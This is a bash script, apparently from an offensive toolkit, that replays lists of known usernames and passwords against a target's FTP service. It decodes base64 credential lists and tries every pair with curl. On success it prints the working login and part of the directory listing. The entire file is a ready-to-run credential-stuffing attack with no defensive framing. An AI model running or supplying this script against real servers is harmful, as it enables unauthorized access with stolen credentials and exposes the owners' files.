#!/bin/bash
# Replay known credentials against FTP service
# Usage: ftp_replay_pairs.sh <TARGET_IP> <known_users_b64> <known_passwords_b64>
set -euo pipefail

TARGET_IP="${1:-127.0.0.1}"
KNOWN_USERS_B64="${2:-}"
KNOWN_PASSES_B64="${3:-}"

echo "=== FTP replay ==="

USERS=$(echo "$KNOWN_USERS_B64" | base64 -d 2>/dev/null) || USERS=""
PASSES=$(echo "$KNOWN_PASSES_B64" | base64 -d 2>/dev/null) || PASSES=""

try_ftp() {
    local u="$1" p="$2"
    local r
    r=$(curl -s -m 10 --user "$u:$p" "ftp://$TARGET_IP/" 2>&1) || true
    if echo "$r" | grep -qiE "drwx|^total|^-rw" \
       && ! echo "$r" | grep -qi "530"; then
        echo "FTP_LOGIN_OK:$u:$p"
        echo "$r" | head -30
        return 0
    fi
    return 1
}

while IFS= read -r u; do
    [ -z "$u" ] && continue
    while IFS= read -r p; do
        [ -z "$p" ] && continue
        try_ftp "$u" "$p" && exit 0
    done <<< "$PASSES"
done <<< "$USERS"

echo "FTP_REPLAY_FAILED"
